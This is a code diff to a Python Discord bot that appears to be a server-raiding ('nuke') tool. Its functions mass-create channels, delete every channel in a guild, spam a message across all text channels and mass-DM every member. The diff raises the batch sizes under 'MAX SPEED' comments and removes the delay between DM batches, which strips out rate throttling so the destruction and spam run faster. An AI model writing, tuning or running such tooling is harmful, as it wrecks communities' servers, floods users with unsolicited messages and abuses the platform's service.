@@ -142,15 +142,19 @@ async def create_rooms(guild):
     
     print(f"\n{DARK_BLUE}[+]{WHITE} Creating {count} rooms...\n")
     
-    chunk_size = 100
+    # MAX SPEED - 200 per batch
+    chunk_size = 200
     created = 0
+    total = count
     
     for i in range(0, count, chunk_size):
         chunk = min(chunk_size, count - i)
-        tasks = [guild.create_text_channel(f"{name}-{i+j+1}") for j in range(chunk)]
+        tasks = []
+        for j in range(chunk):
+            tasks.append(guild.create_text_channel(f"{name}-{i+j+1}"))
         channels = await asyncio.gather(*tasks, return_exceptions=True)
         created += sum(1 for c in channels if not isinstance(c, Exception))
-        print(f"{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {created}/{count}")
+        print(f"{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {created}/{total}")
     
     print(f"\n{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {created} rooms created!")
     print("")
@@ -169,16 +173,18 @@ async def delete_all(guild):
     if confirm == "y":
         print(f"\n{DARK_BLUE}[+]{WHITE} Deleting all channels...\n")
         
-        chunk_size = 50
+        # MAX SPEED - 100 per batch
+        chunk_size = 100
         deleted = 0
         channels = list(guild.channels)
+        total = len(channels)
         
         for i in range(0, len(channels), chunk_size):
             chunk = channels[i:i+chunk_size]
             tasks = [c.delete() for c in chunk]
             results = await asyncio.gather(*tasks, return_exceptions=True)
             deleted += sum(1 for r in results if not isinstance(r, Exception))
-            print(f"{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {deleted}/{len(channels)}")
+            print(f"{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {deleted}/{total}")
         
         print(f"\n{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {deleted} channels deleted!")
     else:
@@ -208,19 +214,22 @@ async def spam_all(guild):
     print("")
     
     msg = input(f"{DARK_BLUE}[?]{WHITE} Message: ").strip()
-    count = int(input(f"{DARK_BLUE}[?]{WHITE} Times: ").strip())
+    count = int(input(f"{DARK_BLUE}[?]{WHITE} Times per channel: ").strip())
     
     print(f"\n{DARK_BLUE}[+]{WHITE} Spamming {count} messages to {len(text_channels)} channels...\n")
     
+    # MAX SPEED - ALL CHANNELS AT ONCE
     total_messages = len(text_channels) * count
     sent = 0
     
+    # Create all tasks at once
     all_tasks = []
     for channel in text_channels:
         for i in range(count):
             all_tasks.append(channel.send(msg))
     
-    chunk_size = 200
+    # Send in chunks of 300 for maximum speed
+    chunk_size = 300
     
     for i in range(0, len(all_tasks), chunk_size):
         chunk = all_tasks[i:i+chunk_size]
@@ -256,23 +265,24 @@ async def dm_all(guild):
     
     print(f"\n{DARK_BLUE}[+]{WHITE} Sending DM to {len(members)} members...\n")
     
+    # MAX SPEED - 50 per batch with create_dm
     sent = 0
-    chunk_size = 30
+    chunk_size = 50
+    total = len(members)
     
     for i in range(0, len(members), chunk_size):
         chunk = members[i:i+chunk_size]
         tasks = []
         for member in chunk:
             try:
-                dm_channel = await member.create_dm()
-                tasks.append(dm_channel.send(msg))
+                dm = await member.create_dm()
+                tasks.append(dm.send(msg))
             except:
                 pass
         if tasks:
             results = await asyncio.gather(*tasks, return_exceptions=True)
             sent += sum(1 for r in results if not isinstance(r, Exception))
-        print(f"{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {sent}/{len(members)}")
-        await asyncio.sleep(0.5)
+        print(f"{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} {sent}/{total}")
     
     print(f"\n{DARK_BLUE}[{GREEN}+{DARK_BLUE}]{WHITE} Sent DM to {sent} members!")
     print("")
